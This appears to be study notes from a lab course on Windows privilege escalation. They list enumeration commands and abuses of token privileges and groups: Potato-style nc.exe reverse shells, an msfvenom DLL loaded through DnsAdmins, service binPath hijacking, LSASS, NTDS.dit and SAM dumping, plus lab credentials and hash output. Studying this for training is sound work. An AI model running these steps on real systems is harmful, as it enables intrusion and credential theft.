## Starting

Check network information
```powershell
ipconfig /all 
arp -a
route print
```

Check windows defender status
```powershell-session
Get-MpComputerStatus
```

List AppLocker rules 
```powershell-session
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Test AppLocker policy to check if cmd is denied by the policy
```powershell-session
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

To check for other thing we can modify the command for example:
```
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\*\*\*\*\*.exe -User Everyone
```

## Initial Enumeration
Get running tasks:

```powershell
tasklist /svc
```

Get env variable and system info

```
set
systeminfo
```

If `systeminfo` doesn't display hotfixes, they may be queriable with [WMI](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)
```cmd-session
wmic qfe
```

We can do this with PowerShell as well using the [Get-Hotfix](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.1) cmdlet.

```powershell-session
PS C:\htb> Get-HotFix | ft -AutoSize
```

Check installed softwares and versions.
```powershell-session
Get-WmiObject -Class Win32_Product |  select Name, Version
```

Then comes favorite part, checking for open services 
```cmd-session
netstat -ano
```

Current  user's info
```powershell
query user
echo %USERNAME%
whoami /priv
whoami /groups
```

Knowing what other users are on the system is important as well. If we gained RDP access to a host using credentials we captured for a user `bob`, and see a `bob_adm` user in the local administrators group, it is worth checking for credential re-use
using net commands 

```cmd-session
net user
```

Knowing what non-standard groups are present on the host can help us determine what the host is used for, how heavily accessed it is, or may even lead to discovering a misconfiguration such as all Domain Users in the Remote Desktop or local administrators groups.
```cmd-session
net localgroup
```

and to have further info about a specific group and its users 
```cmd-session
net localgroup administrators
```
to finish it's worth checking for password policies and account information
```cmd-session
net accounts
```

some cheat- sheets for instance payload all things for an exhaustive list [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
Named pipes, well i know what they are, not gonna explain them (sorry readers), but still can look them up [Named Pipes](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes)
Listing named pipes list
```cmd-session
pipelist.exe /accepteula
```

reviewing a specific named pipe
```cmd-session
accesschk.exe /accepteula \\.\Pipe\lsass -v
accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

## Windows user privileges
### SeImpersonate Example - JuicyPotato

connect to mssql with  MSSQLClient.py example, in other to escalate privileges with set Impersonate:
```shell-session
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```
Once connected we need to enable cmd shell
```shell-session
SQL> enable_xp_cmdshell
```
now we can execute cmd sessions.
```shell-session
xp_cmdshell whoami /priv

```

> [!info]
Note: We don't actually have to type `RECONFIGURE` as Impacket does this for us.

if we ever found ```SeImpersonatePrivilege``` is found, it can be used to impersonate a privileged account such as `NT AUTHORITY\SYSTEM`
We can use  [JuicyPotato](https://github.com/ohpe/juicy-potato) to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via DCOM/NTLM reflection abuse.
example:
```shell-session
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access

```shell-session
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
### SeDebugPrivilege
To run a particular application or service or assist with troubleshooting, a user might be assigned the [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under `Computer Settings > Windows Settings > Security Settings`. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.

this privilege allow us to dump lssas file

> Task manager -> details -> lsass.exe -> Create dump file

We can then try to read and crack NTLM hash. using [pypykatz](https://github.com/skelsec/pypykatz)
First, transfer this [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) over to the target system. Next we just load the script and run it with the following syntax `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Note that we must add a third blank argument `""` at the end for the PoC to work properly.

We save the scrip, we target a process id, then we execute the script. if we have **SeDebugPrivilege** set to true. again we can check by opening a powershell in high priv mod and run `whoami /priv`
```powershell
./script.ps1; [MyProcess]::CreateProcessFromParent((Get-Process "Process name lsas or winlogon ...").id, "c:\Windows\System32\cmd.exe", "")
```
Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`

### SeTakeOwnershipPrivilege
[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This privilege assigns [WRITE_OWNER](https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights) rights over an object, meaning the user can change the owner within the object's security descriptor.
First start enabling it with this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.
to take the ownership of the filewe can use the [takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary
```powershell-session
 takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```
We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.

```powershell-session
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

these are some interesting files to look up.
```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

## Windows Group Privileges
to see group privileges we can use the command `whoami /groups` 

### Backup Operators
Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. which means we can copy a file from folder even tho we don't have access control entry.
but this can't be done with the normal copy command, it has so be done programmatically with [PoC](https://github.com/giuliano108/SeBackupPrivilege) to exploit the `SeBackupPrivilege`, and copy this file. First, let's import the libraries in a PowerShell session.
```powershell-session
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Let's check if `SeBackupPrivilege` is enabled by invoking `whoami /priv` or `Get-SeBackupPrivilege` cmdlet. If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.

>[!info]
>Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.

```powershell-session
whoami /priv
Set-SeBackupPrivilege
Get-SeBackupPrivilege

```
to copy the file use :
```powershell-session
 Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```
As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.

```powershell-session
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`

```cmd-session
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

Using secretsdump from impackets
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

The built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well

```cmd-session
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
even better, so we won't use external tools 

### Event log readers

When belonging to this group, we are able to read the logs, We can query Windows events from the command line using the [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) utility and the [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1) PowerShell cmdlet.

```powershell-session
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

We can also specify alternate credentials for `wevtutil` using the parameters `/u` and `/p`.
```cmd-session
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

using get-WinEvent
```powershell-session
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

### DnsAdmins
Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network, seems interesting =) 
The DNS service runs as an administrator, so it's possible to inject DLLs, and here's how it works:
- DNS management is performed over RPC
- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.
- 
let's go through the attack 
1. Create a payload with msfvenom `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`
2. Transfer it to the victim's machine, with http server and wget
3. use dnscmd to load the DLL,
	- `dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll`
	-  if it's not a privileged user, this cannot be done, and we'll expect an error, verify using `Get-ADGroupMember -Identity DnsAdmins` 
After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts.
1. Find the user's SID 
	- `wmic useraccount where name="netadm" get sid`
2.  if all goes as planned, we'll have our user in domain admins group
	- `net group "Domain Admins" /dom`

>[!warning]
As good and nice future pentester, revoking the steps is necessary, as these are destructive actions.

The first step is confirming that the `ServerLevelPluginDll` registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly.
```cmd-session
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```
#### Deleting Registry Key
We can use the `reg delete` command to remove the key that points to our custom DLL.

```cmd-session
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

#### Starting the DNS Service Again

Once this is done, we can start up the DNS service again.
```cmd-session
C:\htb> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4984
        FLAGS              :
```

#### Checking DNS Service Status

If everything went to plan, querying the DNS service will show that it is running. We can also confirm that DNS is working correctly within the environment by performing an `nslookup` against the localhost or another host in the domain.
```cmd-session
C:\htb> sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

### Print operators
[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.
We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.
To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio. to have root access.

>[!info]
>Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".


### Server Operators
The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges.
Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.
Basically we have to check to an `AppReadiness` service.
```cmd-session
C:\htb> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

We check if our account is a member of local administrators
```cmd-session
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

Next we change the binary path to execute the payload.
```cmd-session
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

And then we start the service
```cmd-session
C:\htb> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

Make sure that our account now is a local admin
```cmd-session
C:\htb> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

Then we can use this account and crackmapexec to dump NTDS database.
```shell-session
MysterPedro@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```

```shell-session
MysterPedro@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...
```

## UAC : User account control
